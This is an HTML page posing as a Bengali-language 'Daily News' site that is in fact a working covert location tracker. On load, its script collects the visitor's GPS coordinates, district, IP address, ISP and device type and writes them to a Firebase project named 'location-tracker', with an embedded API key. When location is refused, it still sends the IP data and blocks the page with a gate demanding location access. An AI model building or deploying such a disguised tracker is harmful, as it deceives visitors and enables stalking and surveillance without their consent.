<!DOCTYPE html>
<html>
<head>
<title>Daily News</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
nav{background:#111;padding:10px;text-align:center;}
nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}

.container{width:95%;margin:auto;margin-top:20px;}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:10px;
border-radius:8px;
cursor:pointer;
}

.card img{
width:100%;
height:150px;
object-fit:cover;
border-radius:6px;
background:#ddd;
}

#articlePage{display:none;}

.article{background:white;padding:15px;border-radius:8px;}
.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}

.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}

/* GATE */
#locationGate{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,0.4);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.gate-box{
background:white;
padding:25px;
border-radius:12px;
width:90%;
max-width:320px;
text-align:center;
}

.gate-box button{
width:100%;
padding:12px;
background:#ff4b5c;
color:white;
border:none;
border-radius:6px;
margin-top:10px;
}
</style>
</head>

<body>

<div id="locationGate">
<div class="gate-box">
<h3>📍 Enable Location</h3>
<p id="gateMsg">Enable location to continue</p>
<button onclick="retryLocation()">Enable Location</button>
</div>
</div>

<header>📰 Daily News</header>

<nav>
<a href="#" onclick="showHome()">Home</a>
<a href="#">বাংলাদেশ</a>
<a href="#">বিশ্ব</a>
<a href="#">খেলা</a>
</nav>

<div class="container">
<div id="homePage">
<div class="ad">📢 Advertisement</div>
<div id="newsContainer" class="grid"></div>
</div>

<div id="articlePage">
<button onclick="showHome()">⬅ Back</button>

<div class="article">
<h2 id="title"></h2>
<img id="image" style="width:100%;margin:10px 0;">
<p id="content"></p>
</div>

<div class="comments">
<h4>💬 Comments</h4>
<div id="commentList"></div>
</div>

</div>
</div>

<div class="footer">© 2026 Daily News</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const app = initializeApp({
apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain:"location-tracker-bba55.firebaseapp.com",
projectId:"location-tracker-bba55"
});

const db = getFirestore(app);

// USER
function getUserId(){
let id = localStorage.getItem("userId")
if(!id){
id = Math.random().toString(36).substring(2,10)
localStorage.setItem("userId", id)
}
return id
}

// DEVICE
function detectDevice(){
let ua=navigator.userAgent;
return /mobile/i.test(ua) ? "Mobile" : "Desktop";
}

function detectDeviceModel(){
let ua=navigator.userAgent;
if(ua.includes("Android")) return "Android";
if(ua.includes("Windows")) return "Windows";
if(ua.includes("Mac")) return "Mac";
return "Unknown";
}

// LOCATION DETAILS
async function getLocationDetails(lat, lon){
try{
let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
let data = await res.json()
let a = data.address

return {
thana:a.suburb || a.village || "unknown",
district:a.state_district || "unknown"
}
}catch{
return {thana:"unknown",district:"unknown"}
}
}

// IP
async function getIP(){
let res = await fetch("https://ipinfo.io/json")
let d = await res.json()
return {ip:d.ip,org:d.org,country:d.country}
}

// SAVE
async function save(data){
await setDoc(doc(db,"locations",getUserId()), data)
}

// GPS
async function handleGPS(pos){
let lat = pos.coords.latitude
let lon = pos.coords.longitude

let loc = await getLocationDetails(lat,lon)
let ip = await getIP()

save({
latitude:lat,
longitude:lon,
thana:loc.thana,
district:loc.district,
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"GPS",
time:new Date().toLocaleString()
})
}

// IP fallback
async function handleIP(){
let ip = await getIP()

save({
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"IP",
time:new Date().toLocaleString()
})
}

// SMART AUTO
let tried = false

function autoDetect(){

navigator.geolocation.getCurrentPosition(
pos=>{
handleGPS(pos)
},
err=>{

if(!tried){
tried = true

navigator.geolocation.getCurrentPosition(
pos=>handleGPS(pos),
()=>showGate(err)
)

}else{
showGate(err)
}

}
)

}

function showGate(err){

handleIP()

document.getElementById("locationGate").style.display="flex"

if(err.code === 1){
document.getElementById("gateMsg").innerText =
"Allow location permission"
}
else if(err.code === 2){
document.getElementById("gateMsg").innerText =
"Turn ON device location (GPS)"
}
else{
document.getElementById("gateMsg").innerText =
"Enable location to continue"
}

}

// RETRY
window.retryLocation = function(){

navigator.geolocation.getCurrentPosition(
pos=>{
document.getElementById("locationGate").style.display="none"
handleGPS(pos)
},
err=>{

if(err.code === 1){
document.getElementById("gateMsg").innerText =
"Allow location permission"
}
else if(err.code === 2){
document.getElementById("gateMsg").innerText =
"Turn ON device location (GPS)"
}
else{
document.getElementById("gateMsg").innerText =
"Try again"
}

}
)

}

// NEWS
const newsData=[
{title:"ঢাকায় বৃষ্টি",image:"https://images.unsplash.com/photo-1500375592092-40eb2168fd21",summary:"বৃষ্টির সম্ভাবনা"},
{title:"বাংলাদেশ জয়",image:"https://images.unsplash.com/photo-1540747913346-19e32dc3e97e",summary:"দারুণ জয়"},
{title:"নতুন ফোন",image:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9",summary:"নতুন মডেল"},
{title:"ডলার বাড়ছে",image:"https://images.unsplash.com/photo-1567427017947-545c5f8d16ad",summary:"অর্থনীতি"},
{title:"যানজট",image:"https://images.unsplash.com/photo-1502877338535-766e1452684a",summary:"সমস্যা বাড়ছে"}
]

// LOAD
function loadNews(){
let c=document.getElementById("newsContainer")
c.innerHTML=""
newsData.forEach((n,i)=>{
let d=document.createElement("div")
d.className="card"
d.innerHTML=`<img src="${n.image}"><h4>${n.title}</h4>`
d.onclick=()=>openArticle(i)
c.appendChild(d)
})
}

window.openArticle=function(i){
let n=newsData[i]
homePage.style.display="none"
articlePage.style.display="block"
title.innerText=n.title
image.src=n.image
content.innerText=n.summary
}

window.showHome=function(){
homePage.style.display="block"
articlePage.style.display="none"
}

// INIT
setTimeout(()=>autoDetect(),1000)
loadNews()

</script>

</body>
</html>
